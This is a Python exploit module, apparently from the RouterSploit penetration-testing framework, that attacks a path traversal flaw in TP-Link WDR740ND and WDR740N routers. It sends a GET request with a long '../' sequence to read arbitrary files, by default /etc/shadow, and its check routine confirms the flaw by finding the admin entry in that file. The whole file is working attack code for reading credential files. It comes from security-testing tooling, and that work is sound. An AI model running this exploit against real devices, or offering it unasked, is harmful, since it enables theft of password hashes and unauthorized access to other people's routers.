from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for TP-Link WDR740ND and WDR740N path traversal vulnerability.
    If the target is vulnerable it allows to read files from the filesystem.
    """
    __info__ = {
        'name': 'TP-Link WDR740ND & WDR740N Path Traversal',
        'description': 'Exploits TP-Link WDR740ND and WDR740N path traversal vulnerability'
                       'that allowsto read files from the filesystem.',
        'authors': [
            'websec.ca',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://www.websec.mx/publicacion/advisories/tplink-wdr740-path-traversal',
        ],
        'devices': [
            'TP-Link WDR740ND',
            'TP-Link WDR740N',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    filename = exploits.Option('/etc/shadow', 'File to read from the filesystem')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            url = "{}:{}/help/../../../../../../../../../../../../../../../..{}".format(self.target, self.port, self.filename)

            print_status("Sending payload request")
            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                pos = response.text.find("//--></SCRIPT>") + 15
                res = response.text[pos:]

                if len(res):
                    print_status("Reading file {}".format(self.filename))
                    print_info(res)
                else:
                    print_error("Could not read file {}".format(self.filename))

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/help/../../../../../../../../../../../../../../../../etc/shadow".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if "Admin:" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
